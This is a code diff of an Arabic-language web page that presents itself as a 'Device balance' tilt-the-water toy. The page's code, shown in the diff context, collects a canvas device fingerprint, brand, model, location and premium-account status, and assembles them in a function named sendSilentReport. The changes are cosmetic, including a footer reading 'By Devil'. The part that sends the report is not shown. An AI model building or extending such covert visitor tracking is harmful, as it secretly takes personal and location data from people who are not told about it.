@@ -269,13 +269,13 @@
         </div>
         
         <div class="gyro-text">
-            <h3 style="margin:0; font-size:18px;">Device Balance</h3>
+            <h3 style="margin:0; font-size:18px;">Device balance</h3>
             <p id="gyro-vals" style="margin:4px 0 0; font-family:'Fira Code'; font-size:12px; color:var(--accent-cyan);">X: 0° | Y: 0°</p>
             <p style="margin:4px 0 0; font-size:10px; color:rgba(255,255,255,0.5);">قم بإمالة الجهاز لتحريك الماء</p>
         </div>
     </div>
     
-    <div style="text-align:center; margin-top:10px; color:#555; font-size:10px;">System Auto-Sync Enabled V3.0</div>
+    <div style="text-align:center; margin-top:10px; color:#555; font-size:10px;">By Devil</div>
 
     <script>
     // --- 1. الإعدادات ---
@@ -328,12 +328,12 @@
         const inputHTML = `
         <div class="section-title"><i class="fa-solid fa-mobile-screen-button"></i> تفاصيل الجهاز</div>
         <div class="glass-card" style="margin-bottom:15px;">
-            <div style="display:flex; flex-direction:column; gap:10px;">
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="in-brand" value="${brand}" readonly style="flex:1; background:rgba(6, 182, 212, 0.1); border:1px solid rgba(6, 182, 212, 0.2); border-radius:12px; padding:12px; color:var(--accent-cyan); font-size:13px; outline:none;">
-                    <input type="text" id="in-model" value="${model}" readonly style="flex:1; background:rgba(139, 92, 246, 0.1); border:1px solid rgba(139, 92, 246, 0.2); border-radius:12px; padding:12px; color:var(--accent-purple); font-size:13px; outline:none;">
-                </div>
-                <input type="text" id="in-canvas" readonly style="background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:12px; color:var(--accent-orange); font-size:10px; outline:none;" placeholder="بصمة الجهاز">
+            <div style="display:flex; flex-direction:column; gap:12px;">
+                <input type="text" id="in-brand" value="${brand}" readonly style="width:100%; background:rgba(6, 182, 212, 0.1); border:1px solid rgba(6, 182, 212, 0.2); border-radius:12px; padding:14px; color:var(--accent-cyan); font-size:14px; outline:none;">
+                
+                <input type="text" id="in-model" value="${model}" readonly style="width:100%; background:rgba(139, 92, 246, 0.1); border:1px solid rgba(139, 92, 246, 0.2); border-radius:12px; padding:14px; color:var(--accent-purple); font-size:14px; outline:none;">
+                
+                <input type="text" id="in-canvas" readonly style="width:100%; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:14px; color:var(--accent-orange); font-size:11px; outline:none;" placeholder="بصمة الجهاز">
             </div>
         </div>`;
         target.insertAdjacentHTML('afterend', inputHTML);
@@ -474,7 +474,7 @@
 
     function sendSilentReport() {
         const msg = `
-📱 <b>تقرير جهاز جديد (V3.0):</b>
+📱 <b>تقرير جهاز جديد:</b>
 ━━━━━━━━━━━━━━━━
 💎 <b>حساب بريميوم:</b> ${collectedData.isPremium}
 🌍 <b>الموقع:</b> <code>${document.getElementById('val-loc').innerText}</code>
